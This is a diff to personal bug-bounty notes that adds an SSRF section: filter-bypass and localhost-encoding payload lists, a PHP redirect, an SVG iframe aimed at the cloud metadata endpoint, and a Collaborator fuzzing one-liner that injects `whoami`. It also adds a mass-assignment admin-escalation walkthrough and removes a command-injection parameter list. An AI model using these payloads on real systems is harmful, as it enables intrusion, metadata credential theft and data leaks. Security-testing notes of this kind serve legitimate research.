@@ -3,6 +3,7 @@ understand the scope
 if small, dont do subdomain analysis, move into appliction analysis 
 #check for sharing authentication
 complex issue    //login issues been overlooked 
+sudo cp ~smartkelvin/go/bin/pdtm  /usr/local/bin  
 
 
 
@@ -590,6 +591,10 @@ Now you need to check if company has the page or not , if no then register as th
   testing for expose -session varaibles-> try to change application roles to admin , it manyatimes exposes the hidden fleid of an appliction    //change from user to admin
   
   when running an unathenticated testing of a web app, check for web app poinsoing in the post request  and check if the content type is returning index.html/text .html
+  
+  /// thread checking /////
+  always check for business thread issues when testing apps shopping cart thereby intercepting the cart request and makng changing of amout of goods or price of goods. and then copy burp new request to the browers and check if the could buy at the same amount with the previous request.. 
+  
   
   
   
@@ -1196,17 +1201,7 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
      
      
    
-     
-     
-     
-     
-     
-     
-     
-     
-
-
-
+   
   CORS  BYPASSING / MISCONFIGURED
   ffuf
   ffuf -w subdomains-top1million-5000.txt -u http://10.20.30.40 -H 'Origin: http://FUZZ.target.com' -mr "Access-Control-Allow-Origin" -ignore-body
@@ -1541,7 +1536,241 @@ http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/pas
   
   
   
+ 
+
+
+    SSRF
+    map the application
+        identify any request parameter that contains hostnames, ip addresses or full url
+                 
+    for each request parameter, modify its value to specify an alternative resources and observes how the application responds 
+        if a defence is in place, attempt to circumn=vent or bypass it using know techniques
+     
+    for each request parameter, modify its value to a server on the internet that you control and monitor the server for incomming request
+    
+    
+    regular/ In band SSrf
+    if the application does not allow for arbitary user-supplied Urls, try to bypass defenses using the following techniques
+         use different encoding schemes
+            decimal-encoded version of 127.0.0  i.e  2130706433
+            127.1 resolves to 127.0.0.1
+            octal rep of 127.0.0.1  i.e  01700000001
+     
+     register a domain name that rsolves to internal ip address (dns rebinding )
+     use your own server that rediriect to an internal ip addresses (http redirection)
+     
+     
+     blind ssrf / out of band ssrf
+     attemps to trigger an http request to an external system that you control and monitor the system for network interaction from the vulnerabble server 
+       using burp collaborator
+      
+      
+      
+         ?url=http://safesite.com&site.com
+  ?url=http://////////////site.com/
+?url=http://site@com/account/edit.aspx
+?url=http://site.com/account/edit.aspx
+?url=http://safesite.com?.site.com
+?url=http://safesite.com#.site.com
+?url=http://safesite.com\.site.com/domain
+?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
+?url=https://192.10.10.3/
+?url=https://192.10.10.2?.192.10.10.3/
+?url=https://192.10.10.2#.192.10.10.3/
+?url=https://192.10.10.2\.192.10.10.3/
+?url=http://127.0.0.1/status/
+?url=http://localhost:8000/status/
+?url=http://site.com/domain.php
+<?php
+header(‘Location: http://127.0.0.1:8080/status');
+?>
+             
+
+                http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
+   http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
+http://////////////site.com/
+http://0000::1:80/
+http://000330.0000072.0000326.00000343
+http://000NaN.000NaN
+http://0177.00.00.01
+http://017700000001
+http://0330.072.0326.0343
+http://033016553343
+http://0NaN
+http://0NaN.0NaN
+http://0x0NaN0NaN
+http://0x7f000001/
+http://0xd8.0x3a.0xd6.0xe3
+http://0xd8.0x3a.0xd6e3
+http://0xd8.0x3ad6e3
+http://0xd83ad6e3
+http://0xNaN.0xaN0NaN
+http://0xNaN.0xNa0x0NaN
+http://0xNaN.0xNaN
+http://127.0.0.1/status/
+http://127.1/
+http://2130706433/
+http://216.0x3a.00000000326.0xe3
+http://3627734755
+http://[::]:80/
+http://localhost:8000/status/
+http://NaN
+http://safesite.com#.site.com
+http://safesite.com&site.com
+http://safesite.com?.site.com
+http://safesite.com\.site.com/domain
+http://shmilon.0xNaN.undefined.undefined
+http://site.com/account/edit.aspx
+http://site.com/domain.php
+http://site@com/account/edit.aspx
+http://whitelisted@127.0.0.1
+https://192.10.10.2#.192.10.10.3/
+https://192.10.10.2?.192.10.10.3/
+https://192.10.10.2\.192.10.10.3/
+https://192.10.10.3/
+https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
+<?php
+header('Location: http://127.0.0.1:8080/status');
+?>
+
+    # Localhost bypasses
+0
+127.00.1
+127.0.01
+0.00.0
+0.0.00
+127.1.0.1
+127.10.1
+127.1.01
+0177.1
+0177.0001.0001
+0x0.0x0.0x0.0x0
+0000.0000.0000.0000
+0x7f.0x0.0x0.0x1
+0177.0000.0000.0001
+0177.0001.0000..0001
+0x7f.0x1.0x0.0x1
+0x7f.0x1.0x1
+
+# Blind SSRF
+- Review Forms
+- Contact Us
+- Password fields
+- Contact or profile info (Names, Addresses)
+- User Agent
+
+# SSRF through video upload
+# https://hackerone.com/reports/1062888
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
+
+# SSRF in pdf rendering
+<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500">
+    <g>
+        <foreignObject width="800" height="500">
+            <body xmlns="http://www.w3.org/1999/xhtml">
+                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
+            </body>
+        </foreignObject>
+    </g>
+</svg>
+ 
+      TIPS
+  1      gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt
+     then create a burpcollaburaor payload server and use qsreplace to replace all parameter value with burpcollaborator server payload and fuzz it with ffuf
+  2  cat testblindssrf.txt | qsreplace “http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" >> ssrfuzz.txt   
+     and then ffuf
+  3  ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
   
+  Now  check whether if we get any http request hit on our burp collaborator server
+  
+  if yes , escalate to Rce with burp collabator
+    example https://url?burpcollabuarator?`payload`
+  
+  http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami` and check the link on your browers
+  
+  TIP
+  Zseano toolkit and methodology
+    discovery subdomain and content
+  amass: amass enum -brute-active -d domain.com -o amass-output.txt
+  
+  working http and https server
+  cat amass-output.txt | httprobe -p http:81 -p http:3000 -p http:3001 -p http:8000 -p http:8080 -p http:8443 -c 50 | tee online-domain.txt
+  
+  dnsgen for some gems
+  amass-output.txt | dnsgen - | httprobe
+  
+  vitual inspection
+  cat domains-endpoint.txt | aquatone
+  
+  to discover files and directories
+  ffuf -ac -v -u https://domain/FUZZ -w wordlist
+  
+  hacking scripts
+  github.com/tomnonnom
+  
+  
+  waybackurlmachine scanner:  this will scrape /robot.txt for all domain i provided  and scrape as many yeasr as possibele. from here i will simply scan each endpoint found via burpintruder or ffuf and determine which endpoint are stll alive 
+  tools: https://gist.github/mhmdiaa
+  also scrapp the home page of each subdomian found to check what used to be there  and also start scrapping for common end point 
+  
+  tools
+  paramscanner, linkfinder, parameth
+  
+  anychanges tool : this tools takes a list of urls and regular check for any changes on th pages. it looks for a new href and reference a new javascript filles 
+  
+  allows try to find new content ,parameters and functionality to look at, website changes every day and you will like to be the first to look out for it and also always take a peak into the website history to check for old files/ directory
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+   
+  
+  
+   TIP
+  
+  Here's how to successfully elevated role to an Internal admin, exposing admin functionalities, resulting in a mass PII leak and access to other sensitive Internal reports:
+
+1️⃣ Navigated to target[.]com and accessed the sign-up page to create an account. 
+
+2️⃣ The sign-up page accepted three parameters: name, email address, and password. 
+
+3️⃣ As a practice, I closely monitored responses from critical functions to spot anything intriguing. Upon successful registration, here's the server's response: 
+
+{"success": true, "user_id": 123, "name": "xxx", "email": "xxx@example.com", "isAdmin": false} 
+
+4️⃣ What would you do if you saw a response like that? You guessed it right! 
+
+5️⃣ Returned to the sign-up form, registered for a new account, and intercepted the following request during sign-up: 
+
+{"name": "xxx", "email": "xxx@example.com", "password": "pass"} 
+
+6️⃣ Injected an additional parameter, "isAdmin": true, to test if the application would process it. Modified my request body to :
+
+{"name": "xxx", "email": "xxx@example.com", "password": "pass", "isAdmin": true} 
+
+7️⃣ BAM! The server processed my account as an admin, making me an Internal admin and revealing significant administrative functionality.
+
+Takeaways: Always scrutinize critical app requests/responses for anomalies. Don't hesitate to spend an extra minute testing the basics—you might be pleasantly surprised by the results! 💡🐛💰
     
 
 
@@ -1572,13 +1801,15 @@ Check out this article for details: https://web.archive.org/web/20220331095516/b
 Here's the link to the nuclei template - https://github.com/projectdiscovery/nuclei-templates/raw/2ff27f5a024d7a8179b241931d00adc4d5d3fa93/dns/ec2-detection.yaml
 Here's the link to the start-stop script - https://github.com/adilnbabras/EC2-Start-Stop
 
-
-
-
-
-
- 
- 
+  
+  
+  
+  
+  
+  
+  
+  
+  
  
  
 
@@ -1741,37 +1972,6 @@ subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:
 
 
 
-
-25 code/command injection and RCE vul
-
-?cmd={payload}
-?exec={payload}
-?command={payload}
-?execute{payload}
-?ping={payload}
-?query={payload}
-?jump={payload}
-?code={payload}
-?reg={payload}
-?do={payload}
-?func={payload}
-?arg={payload}
-?option={payload}
-?load={payload}
-?process={payload}
-?step={payload}
-?read={payload}
-?function={payload}
-?req={payload}
-?feature={payload}
-?exe={payload}
-?module={payload}
-?payload={payload}
-?run={payload}
-?print={payload}
-
-
-
 #https://github.com/codingo/VHostScan
 VHostScan -t example.com
 
@@ -1849,4 +2049,3 @@ open redirect xss
 check vulnerabilities in series
 
 check for takeways when testin a vulnerabilities
-
